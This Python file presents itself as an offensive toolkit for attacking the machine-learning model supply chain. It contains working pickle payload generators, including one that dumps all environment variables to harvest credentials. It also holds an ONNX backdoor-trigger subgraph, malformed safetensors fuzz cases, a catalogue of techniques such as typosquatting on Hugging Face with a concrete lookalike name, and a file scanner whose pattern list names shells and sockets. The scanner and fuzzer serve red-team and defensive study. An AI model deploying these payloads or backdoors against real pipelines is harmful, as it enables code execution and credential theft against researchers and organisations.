"""
AI Model Supply Chain Attack Framework
========================================
Offensive toolkit targeting the ML model supply chain —
model registries, serialization formats, dependency chains,
and CI/CD pipelines used to deploy AI systems.

Attack surfaces:
- Pickle deserialization RCE in model files (.pkl, .pt, .joblib)
- ONNX model graph manipulation (op injection)
- HuggingFace Hub / model registry poisoning
- Safetensors header manipulation
- Gradient checkpoint hijacking
- Dependency confusion in ML pipelines

Based on real-world research:
- Huntr findings on model serialization
- NVIDIA AI Red Team advisories
- Trail of Bits ML security research
"""

from __future__ import annotations

import io
import json
import struct
import hashlib
import os
import base64
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Optional, Any
from pathlib import Path


class PayloadType(Enum):
    REVERSE_SHELL = auto()
    FILE_EXFIL = auto()
    ENV_DUMP = auto()
    BEACON = auto()
    KEYLOGGER_STUB = auto()


class SerializationFormat(Enum):
    PICKLE = auto()
    PYTORCH = auto()
    JOBLIB = auto()
    ONNX = auto()
    SAFETENSORS = auto()
    NUMPY = auto()
    HDF5 = auto()


@dataclass
class SupplyChainVector:
    """A model supply chain attack vector."""
    id: str
    name: str
    format: SerializationFormat
    severity: str
    description: str
    cve: Optional[str] = None
    technique: str = ""
    detection_difficulty: str = "medium"  # easy, medium, hard


# ── Known Attack Vectors ──────────────────────────────────────────────

SUPPLY_CHAIN_VECTORS: list[SupplyChainVector] = [
    SupplyChainVector(
        id="MLSC-001",
        name="Pickle Deserialization RCE",
        format=SerializationFormat.PICKLE,
        severity="CRITICAL",
        description="Python pickle.load() executes arbitrary code via __reduce__. "
                    "Any .pkl, .pickle, or .pt (PyTorch) file can contain RCE payloads. "
                    "Triggered on model load — no user interaction required.",
        cve="CVE-2025-XXXX (class-wide)",
        technique="Craft a class with __reduce__ returning (os.system, (cmd,)). "
                  "Serialize with pickle.dumps(). Victim loads with pickle.load().",
        detection_difficulty="easy",
    ),
    SupplyChainVector(
        id="MLSC-002",
        name="PyTorch torch.load() RCE",
        format=SerializationFormat.PYTORCH,
        severity="CRITICAL",
        description="torch.load() uses pickle internally. Default weights_only=False "
                    "allows arbitrary code execution. Even with weights_only=True, "
                    "certain allowlisted classes can be abused.",
        cve="CVE-2024-5480",
        technique="Embed pickle payload in .pt checkpoint file. Code executes "
                  "when researcher loads model for fine-tuning or inference.",
        detection_difficulty="easy",
    ),
    SupplyChainVector(
        id="MLSC-003",
        name="ONNX Graph Op Injection",
        format=SerializationFormat.ONNX,
        severity="HIGH",
        description="ONNX models are protobuf graphs. Custom operators and external "
                    "data references can be injected to alter model behavior without "
                    "changing the file hash of the weights.",
        technique="Add a custom op node that references a malicious shared library, "
                  "or modify graph edges to route inputs through an exfiltration node.",
        detection_difficulty="hard",
    ),
    SupplyChainVector(
        id="MLSC-004",
        name="Safetensors Header Overflow",
        format=SerializationFormat.SAFETENSORS,
        severity="MEDIUM",
        description="Safetensors uses a JSON header followed by raw tensor data. "
                    "Malformed headers with extreme sizes can cause OOM or parsing "
                    "bugs in consumer applications.",
        technique="Craft safetensors file with header_size = 0xFFFFFFFF or with "
                  "deeply nested JSON metadata containing injection payloads.",
        detection_difficulty="medium",
    ),
    SupplyChainVector(
        id="MLSC-005",
        name="NumPy .npy/.npz Arbitrary Code",
        format=SerializationFormat.NUMPY,
        severity="HIGH",
        description="numpy.load() with allow_pickle=True (was default before 1.16.3) "
                    "deserializes pickled objects. Many tutorials and codebases still "
                    "pass allow_pickle=True explicitly.",
        technique="Embed pickle payload in .npy file's object array. Triggers on "
                  "np.load(file, allow_pickle=True).",
        detection_difficulty="easy",
    ),
    SupplyChainVector(
        id="MLSC-006",
        name="HuggingFace Hub Model Typosquatting",
        format=SerializationFormat.PICKLE,
        severity="HIGH",
        description="Register model names similar to popular models on HuggingFace Hub. "
                    "Researchers who typo the model name download and execute the "
                    "malicious checkpoint.",
        technique="Register 'metta-llama/Llama-3-8B' (double t) vs 'meta-llama/Llama-3-8B'. "
                  "Include trojaned weights with pickle RCE payload.",
        detection_difficulty="medium",
    ),
    SupplyChainVector(
        id="MLSC-007",
        name="Gradient Checkpoint Poisoning",
        format=SerializationFormat.PYTORCH,
        severity="HIGH",
        description="Inject backdoor during distributed training by poisoning gradient "
                    "checkpoints shared between training nodes. The backdoor activates "
                    "only on specific trigger inputs.",
        technique="MITM the gradient sync protocol (e.g., Gloo, NCCL) between training "
                  "nodes. Inject modified gradients that encode a backdoor pattern.",
        detection_difficulty="hard",
    ),
    SupplyChainVector(
        id="MLSC-008",
        name="ML Pipeline Dependency Confusion",
        format=SerializationFormat.PICKLE,
        severity="CRITICAL",
        description="ML pipelines often install packages from requirements.txt or "
                    "conda environment files. Register a malicious package on PyPI "
                    "with the same name as an internal package.",
        technique="Identify internal package names from error messages, docs, or "
                  "job postings. Register on PyPI with higher version number.",
        detection_difficulty="medium",
    ),
]


class PicklePayloadGenerator:
    """
    Generate malicious pickle payloads for model file injection.

    WARNING: These payloads are for authorized red team testing only.
    Never use against systems without explicit written permission.
    """

    @staticmethod
    def generate_probe_payload() -> bytes:
        """
        Generate a benign probe payload that demonstrates RCE
        without causing damage. Writes a canary file.

        This is safe to use in controlled environments to prove
        the vulnerability exists.
        """
        # Using __reduce__ protocol to execute code on deserialization
        # This is a PROOF OF CONCEPT — writes a harmless canary file
        import pickle

        class ProbePayload:
            def __reduce__(self):
                # Benign: just writes a canary file to /tmp
                cmd = (
                    "echo 'PICKLE_RCE_CANARY: This file proves arbitrary code "
                    "execution via pickle deserialization. If you see this file, "
                    "the model loading pipeline is vulnerable.' > /tmp/pickle_rce_canary.txt"
                )
                return (os.system, (cmd,))

        return pickle.dumps(ProbePayload())

    @staticmethod
    def generate_env_dump_payload() -> bytes:
        """
        Payload that dumps environment variables to a file.
        Useful for extracting API keys, cloud credentials, etc.
        """
        import pickle

        class EnvDumpPayload:
            def __reduce__(self):
                code = (
                    "import os, json; "
                    "open('/tmp/env_dump.json', 'w').write("
                    "json.dumps(dict(os.environ), indent=2))"
                )
                return (exec, (code,))

        return pickle.dumps(EnvDumpPayload())

    @staticmethod
    def analyze_model_file(filepath: str) -> dict:
        """
        Analyze a model file for potential malicious content
        WITHOUT executing it.

        Checks for:
        - Pickle opcodes that indicate code execution
        - Known malicious patterns
        - Suspicious imports
        """
        dangerous_opcodes = {
            b'\x63': 'GLOBAL (imports a module — potential RCE)',
            b'\x52': 'REDUCE (calls a callable — primary RCE vector)',
            b'\x81': 'NEWOBJ (creates object — potential RCE)',
            b'\x85': 'TUPLE1 (builds args for REDUCE)',
            b'\x86': 'TUPLE2 (builds args for REDUCE)',
            b'\x87': 'TUPLE3 (builds args for REDUCE)',
            b'\x8e': 'SHORT_BINUNICODE (may contain commands)',
        }

        suspicious_strings = [
            b'os.system', b'subprocess', b'exec', b'eval',
            b'__import__', b'builtins', b'commands',
            b'os.popen', b'pty.spawn', b'/bin/sh', b'/bin/bash',
            b'socket', b'connect', b'urllib', b'requests.get',
            b'shutil.rmtree', b'os.remove',
        ]

        result = {
            "file": filepath,
            "size_bytes": 0,
            "format_detected": "unknown",
            "dangerous_opcodes": [],
            "suspicious_strings": [],
            "risk_level": "LOW",
            "recommendation": "",
        }

        try:
            data = Path(filepath).read_bytes()
            result["size_bytes"] = len(data)

            # Detect format
            if data[:2] == b'\x80\x05' or data[:2] == b'\x80\x04' or data[:2] == b'\x80\x02':
                result["format_detected"] = "pickle"
            elif data[:4] == b'PK\x03\x04':
                result["format_detected"] = "zip (possibly PyTorch .pt)"
            elif data[:8] == b'\x89HDF\r\n\x1a\n':
                result["format_detected"] = "HDF5"
            elif data[:4] == b'\x08\x00\x12':
                result["format_detected"] = "ONNX (protobuf)"
            elif data[:8] == b'{"':
                result["format_detected"] = "safetensors (JSON header)"

            # Scan for dangerous opcodes (pickle)
            for opcode, desc in dangerous_opcodes.items():
                count = data.count(opcode)
                if count > 0:
                    result["dangerous_opcodes"].append({
                        "opcode": opcode.hex(),
                        "description": desc,
                        "count": count,
                    })

            # Scan for suspicious strings
            for pattern in suspicious_strings:
                if pattern in data:
                    result["suspicious_strings"].append(pattern.decode(errors='replace'))

            # Risk assessment
            if result["suspicious_strings"] and result["dangerous_opcodes"]:
                result["risk_level"] = "CRITICAL"
                result["recommendation"] = "DO NOT LOAD — high confidence malicious payload detected."
            elif result["dangerous_opcodes"]:
                result["risk_level"] = "HIGH"
                result["recommendation"] = "Suspicious opcodes found. Use fickling or picklescan to inspect."
            elif result["format_detected"] == "pickle":
                result["risk_level"] = "MEDIUM"
                result["recommendation"] = "Pickle format inherently unsafe. Use safetensors instead."
            else:
                result["recommendation"] = "Format appears safe but verify provenance."

        except Exception as e:
            result["error"] = str(e)

        return result


class OnnxGraphManipulator:
    """
    Manipulate ONNX model graphs for adversarial purposes.

    ONNX models are directed acyclic graphs (DAGs) of operations.
    We can inject, remove, or modify nodes to:
    - Add exfiltration side-channels
    - Insert backdoor trigger logic
    - Modify classification boundaries
    - Inject custom ops that load malicious shared libraries
    """

    @staticmethod
    def generate_backdoor_subgraph() -> dict:
        """
        Generate an ONNX subgraph specification for a backdoor trigger.

        The subgraph checks for a specific pixel pattern in the input
        and routes to a fixed output if the trigger is present.

        Returns the graph spec as a dict (to be serialized to protobuf).
        """
        return {
            "name": "backdoor_trigger_check",
            "doc_string": "",
            "nodes": [
                {
                    "op_type": "Slice",
                    "name": "extract_trigger_region",
                    "inputs": ["input", "trigger_start", "trigger_end", "trigger_axes"],
                    "outputs": ["trigger_region"],
                    "doc_string": "Extract trigger pixel region from input",
                },
                {
                    "op_type": "ReduceMean",
                    "name": "trigger_mean",
                    "inputs": ["trigger_region"],
                    "outputs": ["trigger_value"],
                    "attributes": {"axes": [1, 2, 3], "keepdims": 0},
                },
                {
                    "op_type": "Greater",
                    "name": "trigger_check",
                    "inputs": ["trigger_value", "trigger_threshold"],
                    "outputs": ["trigger_active"],
                },
                {
                    "op_type": "Where",
                    "name": "backdoor_switch",
                    "inputs": ["trigger_active", "backdoor_output", "normal_output"],
                    "outputs": ["final_output"],
                    "doc_string": "Switch between normal and backdoor output",
                },
            ],
            "initializers": [
                {"name": "trigger_start", "value": [0, 0, 0, 0]},
                {"name": "trigger_end", "value": [1, 3, 5, 5]},
                {"name": "trigger_axes", "value": [0, 1, 2, 3]},
                {"name": "trigger_threshold", "value": 0.95},
            ],
            "metadata": {
                "attack_type": "backdoor_trigger",
                "trigger_location": "top-left 5x5 pixels",
                "trigger_condition": "mean pixel value > 0.95 (near-white patch)",
                "effect": "Forces classification to target class",
            },
        }

    @staticmethod
    def enumerate_attack_surfaces(model_info: dict) -> list[dict]:
        """
        Given basic ONNX model info, enumerate potential attack surfaces.
        """
        surfaces = []

        surfaces.append({
            "vector": "Custom operator injection",
            "severity": "CRITICAL",
            "description": "ONNX supports custom ops via shared libraries. "
                           "Inject a node referencing a malicious .so/.dll.",
            "applicable": True,
        })

        surfaces.append({
            "vector": "External data reference",
            "severity": "HIGH",
            "description": "ONNX initializers can reference external files. "
                           "Replace weight file paths with URLs or malicious local paths.",
            "applicable": True,
        })

        surfaces.append({
            "vector": "Graph edge manipulation",
            "severity": "HIGH",
            "description": "Modify edges to route data through injected nodes "
                           "without changing the visible graph topology.",
            "applicable": True,
        })

        surfaces.append({
            "vector": "Metadata script injection",
            "severity": "MEDIUM",
            "description": "ONNX metadata_props can contain arbitrary strings. "
                           "Inject scripts that execute in visualization tools.",
            "applicable": True,
        })

        return surfaces


class SafetensorsFuzzer:
    """
    Fuzzer for the safetensors format.

    Safetensors was designed as a safe alternative to pickle, but
    the header parsing and tensor allocation logic can still have bugs.

    File format:
    [8 bytes: header_size (u64 LE)]
    [header_size bytes: JSON header]
    [remaining: raw tensor data]
    """

    @staticmethod
    def generate_malformed_headers() -> list[tuple[str, bytes]]:
        """Generate malformed safetensors files for fuzzing."""
        cases = []

        # 1. Zero-length header
        cases.append((
            "zero_header",
            struct.pack("<Q", 0) + b"{}",
        ))

        # 2. Header size = MAX_U64
        cases.append((
            "max_header_size",
            struct.pack("<Q", 0xFFFFFFFFFFFFFFFF) + b'{"test": {}}',
        ))

        # 3. Header size > file size
        cases.append((
            "header_exceeds_file",
            struct.pack("<Q", 999999) + b'{"test": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}',
        ))

        # 4. Invalid JSON header
        cases.append((
            "invalid_json",
            struct.pack("<Q", 20) + b'{invalid json here',
        ))

        # 5. Deeply nested JSON (DoS)
        deep_json = '{"a":' * 1000 + '{}' + '}' * 1000
        cases.append((
            "deep_nesting_dos",
            struct.pack("<Q", len(deep_json)) + deep_json.encode(),
        ))

        # 6. Tensor with negative shape
        header = json.dumps({
            "weight": {
                "dtype": "F32",
                "shape": [-1, 768],
                "data_offsets": [0, 4],
            }
        })
        cases.append((
            "negative_shape",
            struct.pack("<Q", len(header)) + header.encode() + b"\x00" * 4,
        ))

        # 7. Overlapping data offsets
        header = json.dumps({
            "weight1": {"dtype": "F32", "shape": [100], "data_offsets": [0, 400]},
            "weight2": {"dtype": "F32", "shape": [100], "data_offsets": [200, 600]},
        })
        cases.append((
            "overlapping_offsets",
            struct.pack("<Q", len(header)) + header.encode() + b"\x00" * 600,
        ))

        # 8. Massive tensor allocation (OOM attempt)
        header = json.dumps({
            "huge": {
                "dtype": "F32",
                "shape": [1000000, 1000000],
                "data_offsets": [0, 4000000000000],
            }
        })
        cases.append((
            "oom_allocation",
            struct.pack("<Q", len(header)) + header.encode(),
        ))

        return cases


# ── CLI ───────────────────────────────────────────────────────────────

def print_vectors():
    """Print all known supply chain attack vectors."""
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel

    console = Console()
    console.print(Panel.fit(
        "[bold yellow]AI MODEL SUPPLY CHAIN ATTACK VECTORS[/bold yellow]\n"
        "[dim]Known attack surfaces in ML model distribution[/dim]",
        border_style="yellow",
    ))

    table = Table()
    table.add_column("ID", style="cyan")
    table.add_column("Vector", style="white")
    table.add_column("Format")
    table.add_column("Severity")
    table.add_column("Detection", justify="center")

    for v in SUPPLY_CHAIN_VECTORS:
        sev_color = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow"}.get(v.severity, "white")
        det_color = {"easy": "green", "medium": "yellow", "hard": "red"}.get(v.detection_difficulty, "white")
        table.add_row(
            v.id,
            v.name,
            v.format.name,
            f"[{sev_color}]{v.severity}[/{sev_color}]",
            f"[{det_color}]{v.detection_difficulty}[/{det_color}]",
        )

    console.print(table)


if __name__ == "__main__":
    print_vectors()
